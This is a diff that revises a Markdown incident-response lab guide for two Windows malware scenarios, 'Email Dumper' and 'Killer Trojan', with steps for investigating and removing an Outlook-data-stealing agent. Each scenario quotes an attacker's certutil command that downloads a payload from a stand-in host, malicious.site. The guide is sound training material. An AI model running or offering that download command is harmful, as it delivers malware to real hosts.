@@ -18,7 +18,7 @@ Description: GitHub-compatible Markdown (GHM) version using supported HTML like 
 
 ### 🔎 Scenario: Email Dumper
 
-A suspicious alert has been triggered on a Windows host. The attacker used native Windows tools such as PowerShell and Certutil to drop and execute a payload (`agent.exe`) designed to steal Outlook email data. Your objective is to identify the source of compromise, track how the malware was deployed, and remove its persistence mechanisms.
+A security alert from the EDR system has flagged unusual command-line activity on a Windows host belonging to a university staff member. Early indications show the use of native Windows tools to download and run an unknown payload. Your task is to investigate the host, confirm if email data was targeted, and fully remediate the system.
 
 ---
 
@@ -39,19 +39,16 @@ Use Task Manager or PowerShell to check for suspicious processes:
 
 ```powershell
 taskmgr
-```
-
-```powershell
 tasklist | findstr /i "powershell certutil agent cmd"
 ```
 
-Kill suspicious processes:
+Terminate suspicious entries:
 
 ```powershell
 taskkill /F /PID <PID>
 ```
 
-Use Process Hacker (if available) to review the process tree:
+Use Process Hacker (or similar tool) to verify parent-child chain:
 
 > Look for:
 > ```
@@ -68,77 +65,76 @@ Open Event Viewer:
 eventvwr
 ```
 
-Navigate to:
+Check:
 
-```
-Windows Logs > Security > Event ID 4688
-```
+- **Windows Logs > Security > Event ID 4688**
+- **Applications and Services Logs > Microsoft > Windows > Sysmon**
 
-Or use Sysmon (if configured) to find:
+Look for:
 
-- **Event ID 1**: Process creation
-- **Event ID 11**: File creation (`agent.exe`)
-- **Event ID 3**: Outbound connections
-
-Check for execution of:
-
-- `certutil.exe` with URL
 - `powershell.exe -enc`
-- Creation of agent.exe in Roaming
+- `certutil.exe` with full URL
+- file creation of `agent.exe`
+- network connections from the agent process
+
+> Bonus: View command line arguments and parent process IDs in event details.
 
 ---
 
 ### 🧪 Step 3: Certutil Abuse
 
-Attacker downloads a payload using built-in `certutil`:
+The attacker used `certutil` to download a payload directly from the command line:
 
 ```powershell
 certutil -urlcache -split -f http://malicious.site/agent.exe agent.exe
 ```
 
-Check typical drop paths:
+Search for the dropped payload:
 
 ```powershell
 Get-ChildItem -Path "C:\Users\<user>\AppData\Roaming" -Include agent.exe -Recurse
+Get-ChildItem -Path "C:\Users\<user>\AppData\Local\Temp" -Include agent.exe -Recurse
+Get-ChildItem -Path "C:\Users\<user>\Desktop","Downloads" -Include agent.exe -Recurse
 ```
 
-Check for file creation via timestamp:
+Check file metadata and creation time:
 
 ```powershell
 Get-Item "C:\Users\<user>\AppData\Roaming\agent.exe" | Select-Object Name, CreationTime, LastAccessTime
+Get-AuthenticodeSignature "C:\Users\<user>\AppData\Roaming\agent.exe"
 ```
 
 ---
 
 ### 🧬 Step 4: Obfuscated PowerShell Decoding
 
-Check for encoded PowerShell:
+The attacker used a base64-encoded payload:
 
 ```powershell
 powershell.exe -enc <Base64>
 ```
 
-Decode:
+Decode and inspect:
 
 ```powershell
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<Base64>"))
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<Base64String>"))
 ```
 
-Look for chained execution commands (e.g., `iex`, `Start-Process`, `DownloadString`).
+Look for embedded downloaders or payload launchers (e.g., `iex`, `Start-Process`).
 
 ---
 
-### 🗓 Step 5: Check for Persistence – Scheduled Tasks
+### 🗓 Step 5: Check Scheduled Tasks for Persistence
 
-List all tasks and identify any that run suspicious commands:
+List all scheduled tasks:
 
 ```powershell
 schtasks /query /fo LIST /v
 ```
 
-Check for tasks running `agent.exe`, `powershell`, or `.bat` files.
+Look for tasks that point to suspicious `.exe`, `.bat`, or PowerShell commands.
 
-Remove if confirmed malicious:
+Remove confirmed malicious tasks:
 
 ```powershell
 Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
@@ -146,16 +142,16 @@ Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
 
 ---
 
-### 🧼 Step 6: Check for Persistence – Registry Autoruns
+### 🧼 Step 6: Check Registry Autoruns
 
-Query auto-run keys:
+Review autorun keys:
 
 ```powershell
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 ```
 
-Remove malicious entries:
+Remove entries pointing to `agent.exe`:
 
 ```powershell
 reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
@@ -165,13 +161,13 @@ reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
 
 ### 🌐 Step 7: Network Connections
 
-Check for outbound connections or C2 channels:
+Check for active or historical network sessions:
 
 ```powershell
 netstat -bano
 ```
 
-Match PID with:
+Correlate PID to process:
 
 ```powershell
 tasklist | findstr <PID>
@@ -181,13 +177,15 @@ tasklist | findstr <PID>
 
 ### 📂 Step 8: Investigate Email Data Access
 
-Search for email data files likely targeted by the malware:
+The agent is designed to steal Outlook email archives.
+
+Search for `.pst` and `.ost` files:
 
 ```powershell
 Get-ChildItem -Path "C:\Users" -Include *.pst,*.ost -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-Check last access time to confirm if they were read:
+Check last access time:
 
 ```powershell
 Get-Item "C:\Users\<user>\AppData\Local\Microsoft\Outlook\*.ost" | Select-Object Name, LastAccessTime
@@ -197,21 +195,42 @@ Get-Item "C:\Users\<user>\AppData\Local\Microsoft\Outlook\*.ost" | Select-Object
 
 ### ✅ Step 9: Remediation
 
+Terminate running payload:
+
 ```powershell
 taskkill /F /PID <PID>
-Remove-Item -Path "C:\Users\<user>\AppData\Roaming\agent.exe" -Force
-Unregister-ScheduledTask -TaskName "<Name>" -Confirm:$false
 ```
+
+Delete the malicious executable:
+
+```powershell
+Remove-Item -Path "C:\Users\<user>\AppData\Roaming\agent.exe" -Force
+```
+
+Remove registry and task persistence:
+
+```powershell
+Unregister-ScheduledTask -TaskName "<Name>" -Confirm:$false
+reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
+```
+
+---
+
+### 🧾 Analyst Notes
+
+- Isolate the host from the network to prevent C2 callbacks
+- Submit `agent.exe` to a sandbox or malware analysis platform
+- Check other endpoints for indicators (e.g., certutil usage or registry persistence)
 
 ---
 
 ### 🧠 Key Takeaways
 
-- Certutil can be weaponised to download files without AV alerts (LOLBAS)
-- Outlook `.ost`/`.pst` files can be silently accessed and exfiltrated
-- Base64-encoded PowerShell is used to obscure malicious scripts
-- Persistence is commonly set via scheduled tasks or registry autoruns
-- Event Logs and Sysmon are essential to trace the full execution path
+- LOLBAS abuse (`certutil`, `powershell -enc`) remains a common tactic for initial payload delivery
+- Obfuscated PowerShell is frequently used to evade detection and download malware
+- Email data (`.pst`/`.ost`) is highly targeted and should be monitored for access
+- Registry and scheduled tasks remain common persistence techniques
+- Combining Sysmon and Event Viewer logs paints a full picture of the infection timeline
 
 </details>
 
@@ -223,7 +242,7 @@ Unregister-ScheduledTask -TaskName "<Name>" -Confirm:$false
 
 ### 🔎 Scenario: Killer Trojan
 
-A Trojan has infected a Windows host. The attacker uses native tools to download and execute the payload, set up persistence, and attempt to communicate externally. Your mission is to identify the infection vector, isolate the binary, confirm persistence, and clean it all up.
+An EDR alert has flagged suspicious behaviour on a user workstation. Analysis indicates a Trojan was downloaded and executed using built-in Windows utilities, with attempts to establish persistence and possibly access email data. Your goal is to investigate the host, confirm the infection method, locate the payload, and eradicate all signs of compromise.
 
 ---
 
@@ -238,99 +257,118 @@ A Trojan has infected a Windows host. The attacker uses native tools to download
 
 ---
 
-### 🧱 Step 1: Identify Suspicious Processes
+### 🧱 Step 1: Initial Process Investigation
 
-Check for known LOLBAS abuse or unknown executables:
+List active processes using Task Manager or terminal:
 
 ```powershell
-tasklist | findstr /i "powershell cmd certutil rundll32 regsvr32 agent"
+taskmgr
+tasklist | findstr /i "powershell certutil cmd agent rundll32 regsvr32"
 ```
 
-Kill suspected malware:
+Terminate suspicious binaries:
 
 ```powershell
 taskkill /F /PID <PID>
 ```
 
-Inspect parent-child process chain using Process Hacker or Sysmon:
+Check parent-child process lineage:
 
-> Example:
+> Example chain:
 > ```
 > explorer.exe → powershell.exe → certutil.exe → agent.exe
 > ```
 
+Tools like **Process Hacker** or **Sysmon event ID 1** can help confirm this chain.
+
 ---
 
-### 📜 Step 2: Review Logs
+### 📜 Step 2: Log Review
 
-Open Event Viewer or use Sysmon:
+Open Event Viewer:
 
 ```powershell
 eventvwr
 ```
 
-Check:
+Check the following:
 
-- **Security Log → Event ID 4688**
-- **Sysmon → Event ID 1 (Process), 11 (File), 3 (Network)**
+- **Security > Event ID 4688**: Process Creation
+- **Sysmon > Event ID 1**: Process Creation  
+- **Sysmon > Event ID 11**: File Creation  
+- **Sysmon > Event ID 3**: Network Connection
 
-Search for:
+Look for:
 
-- certutil execution
-- creation of `agent.exe`
-- outbound connections to IP addresses
+- `certutil.exe` downloads
+- agent.exe execution
+- any outbound connection attempts
 
 ---
 
-### 🧪 Step 3: Certutil Download Detection
+### 🧪 Step 3: Certutil Payload Download
 
-Check for file downloads via:
+The attacker downloaded a payload using:
 
 ```powershell
 certutil -urlcache -split -f http://malicious.site/agent.exe agent.exe
 ```
 
-Confirm presence in:
+Check for known drop paths:
 
 ```powershell
-C:\Users\<user>\AppData\Roaming\
+Get-ChildItem -Path "C:\Users\<user>\AppData\Roaming" -Include agent.exe -Recurse
+Get-ChildItem -Path "C:\Users\<user>\AppData\Local\Temp" -Include agent.exe -Recurse
 ```
 
-View file details:
+Optional Defender scan:
 
 ```powershell
-Get-Item "C:\Users\<user>\AppData\Roaming\agent.exe" | Select-Object Name, LastAccessTime
+Start-MpScan -ScanType CustomScan -ScanPath "C:\Users\<user>\AppData\Roaming\agent.exe"
+```
+
+Inspect file metadata:
+
+```powershell
+Get-Item "C:\Users\<user>\AppData\Roaming\agent.exe" | Select-Object Name, CreationTime, LastAccessTime
+Get-AuthenticodeSignature "C:\Users\<user>\AppData\Roaming\agent.exe"
 ```
 
 ---
 
-### 🧬 Step 4: Decode PowerShell (if used)
+### 🧬 Step 4: Obfuscated PowerShell Execution (if used)
 
-If the Trojan was executed via PowerShell `-enc`:
+Check for base64-encoded PowerShell commands in logs:
 
 ```powershell
 powershell.exe -enc <Base64>
 ```
 
-Decode and analyse:
+Decode with:
 
 ```powershell
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<Base64>"))
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<Base64String>"))
 ```
+
+Look for:
+- `Start-Process`, `Invoke-WebRequest`
+- Calls to run `agent.exe` or add registry tasks
 
 ---
 
-### 🗓 Step 5: Check Scheduled Task Persistence
+### 🗓 Step 5: Scheduled Task Persistence
 
-List all scheduled tasks:
+List scheduled tasks and review commands:
 
 ```powershell
 schtasks /query /fo LIST /v
 ```
 
-Look for tasks pointing to `agent.exe`, `.bat`, or obfuscated PowerShell.
+Look for:
+- Custom task names
+- Execution of `agent.exe`, `.bat` scripts, or PowerShell
 
-Remove suspicious task:
+Delete malicious tasks:
 
 ```powershell
 Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
@@ -338,15 +376,16 @@ Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
 
 ---
 
-### 🧼 Step 6: Registry Persistence
+### 🧼 Step 6: Registry Autorun Persistence
 
-Check common run keys:
+Query common persistence keys:
 
 ```powershell
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 ```
 
-Delete persistence entry:
+Remove malicious entries:
 
 ```powershell
 reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
@@ -354,58 +393,79 @@ reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
 
 ---
 
-### 🌐 Step 7: Network Connection Analysis
+### 🌐 Step 7: Network Connection Check
 
-Identify active connections:
+List outbound connections:
 
 ```powershell
 netstat -bano
 ```
 
-Then map PIDs to:
+Correlate PIDs to process names:
 
 ```powershell
 tasklist | findstr <PID>
 ```
 
-> Look for C2 communication or reverse shell activity.
+> Note any strange external IPs or repeated attempts to connect to the same destination.
 
 ---
 
-### 📁 Step 8: Search for Email Data or Artefacts
+### 📁 Step 8: Search for Email Artefacts or Exfil
 
-Check for `.pst`/`.ost` files that may have been targeted or staged for exfil:
+While no confirmed exfiltration occurred, the Trojan may target email data.
 
 ```powershell
-Get-ChildItem -Path C:\Users -Include *.pst,*.ost -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path "C:\Users" -Include *.pst,*.ost -File -Recurse -ErrorAction SilentlyContinue
 ```
 
 Check access timestamps:
 
 ```powershell
-Get-Item "<fullpath>" | Select-Object Name, LastAccessTime
+Get-Item "C:\Users\<user>\AppData\Local\Microsoft\Outlook\*.ost" | Select-Object Name, LastAccessTime
 ```
 
 ---
 
-### ✅ Step 9: Remediate
+### ✅ Step 9: Remediation
+
+Terminate process:
 
 ```powershell
 taskkill /F /PID <PID>
+```
+
+Remove agent binary:
+
+```powershell
 Remove-Item -Path "C:\Users\<user>\AppData\Roaming\agent.exe" -Force
+```
+
+Clean up persistence:
+
+```powershell
 Unregister-ScheduledTask -TaskName "<Name>" -Confirm:$false
 reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
 ```
 
 ---
 
+### 🧾 Analyst Notes
+
+- Isolate the machine from the network
+- Submit `agent.exe` to an analysis platform
+- Review other hosts for indicators: certutil use, autorun registry entries, matching hashes
+- Consider implementing command-line logging or AppLocker
+
+---
+
 ### 🧠 Key Takeaways
 
-- Certutil was used for payload download — a common red flag
-- Registry and scheduled tasks were used to persist the agent
-- File access timestamps are key to confirming data staging or theft
-- Agent may behave like an info-stealer, focusing on Outlook data
-- Use parent-child process maps and Sysmon to trace infection paths
+- LOLBAS techniques like `certutil` are frequently used to bypass security software
+- Roaming and Temp folders are often used for staging malware
+- Registry Run keys and Scheduled Tasks are standard persistence methods
+- Email data remains a high-value target — access logs matter
+- Event logs and process lineage tracking (via Sysmon) are critical for full investigation
 
 </details>
 
